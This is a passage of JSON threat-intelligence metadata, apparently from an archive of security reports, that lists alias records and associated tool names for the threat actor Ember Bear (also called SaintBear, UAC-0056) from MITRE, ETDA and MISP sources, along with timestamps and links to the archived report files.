            "updated_at": "2025-03-27T02:00:55.511386Z",
            "deleted_at": null,
            "main_name": "Ember Bear",
            "aliases": [
                "Ember Bear",
                "UNC2589",
                "Bleeding Bear",
                "DEV-0586",
                "Cadet Blizzard",
                "Frozenvista",
                "UAC-0056"
            ],
            "source_name": "MITRE:Ember Bear",
            "tools": [
                "P.A.S. Webshell",
                "CrackMapExec",
                "ngrok",
                "WhisperGate",
                "Saint Bot",
                "PsExec",
                "Rclone",
                "Impacket",
                "OutSteel"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "083d63b2-3eee-42a8-b1bd-54e657a229e8",
            "created_at": "2022-10-25T16:07:24.143338Z",
            "updated_at": "2025-03-27T02:02:10.12138Z",
            "deleted_at": null,
            "main_name": "SaintBear",
            "aliases": [
                "Ember Bear",
                "FROZENVISTA",
                "Lorec53",
                "Nascent Ursa",
                "Nodaria",
                "SaintBear",
                "Storm-0587",
                "TA471",
                "UAC-0056",
                "UNC2589"
            ],
            "source_name": "ETDA:SaintBear",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Elephant Client",
                "Elephant Implant",
                "GraphSteel",
                "Graphiron",
                "GrimPlant",
                "OutSteel",
                "Saint Bot",
                "SaintBot",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eecf54a2-2deb-41e5-9857-fed94a53f858",
            "created_at": "2023-01-06T13:46:39.349959Z",
            "updated_at": "2025-03-27T02:00:03.057647Z",
            "deleted_at": null,
            "main_name": "SaintBear",
            "aliases": [
                "UAC-0056",
                "Nascent Ursa",
                "Nodaria",
                "FROZENVISTA",
                "Storm-0587",
                "Lorec53",
                "Lorec Bear",
                "UNC2589",
                "TA471",
                "DEV-0587",
                "Saint Bear",
                "EMBER BEAR",
                "Bleeding Bear"
            ],
            "source_name": "MISPGALAXY:SaintBear",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "03a6f362-cbab-4ce9-925d-306b8c937bf1",
            "created_at": "2024-11-01T02:00:52.635907Z",
            "updated_at": "2025-03-27T02:00:55.474243Z",
            "deleted_at": null,
            "main_name": "Saint Bear",
            "aliases": [
                "Saint Bear",
                "Storm-0587",
                "TA471",
                "UAC-0056",
                "Lorec53"
            ],
            "source_name": "MITRE:Saint Bear",
            "tools": [
                "OutSteel",
                "Saint Bot"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535919,
    "ts_updated_at": 1743041777,
    "ts_creation_date": 1658167795,
    "ts_modification_date": 1658167795,
    "files": {
        "pdf": "https://archive.orkl.eu/a1f88be4ccef59b74c108d1efcaf89f7ba6cda04.pdf",
        "text": "https://archive.orkl.eu/a1f88be4ccef59b74c108d1efcaf89f7ba6cda04.txt",
        "img": "https://archive.orkl.eu/a1f88be4ccef59b74c108d1efcaf89f7ba6cda04.jpg"
    }
}